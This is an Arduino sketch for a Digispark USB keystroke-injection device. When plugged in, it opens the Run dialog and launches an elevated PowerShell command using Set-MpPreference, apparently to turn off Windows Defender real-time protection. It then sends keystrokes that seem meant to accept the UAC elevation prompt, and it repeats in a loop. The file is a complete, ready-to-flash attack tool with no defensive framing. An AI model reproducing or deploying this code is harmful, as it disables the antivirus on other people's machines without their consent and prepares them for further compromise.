#include "DigiKeyboard.h"
// let's rock and role
void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT,KEY_R);
  DigiKeyboard.delay(200);
  // starting power shell.
  DigiKeyboard.print("powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  /*
   * for administrator
   * DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_ENTER);
   * DigiKeyboard.delay(1000);
  */
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_Y);
}
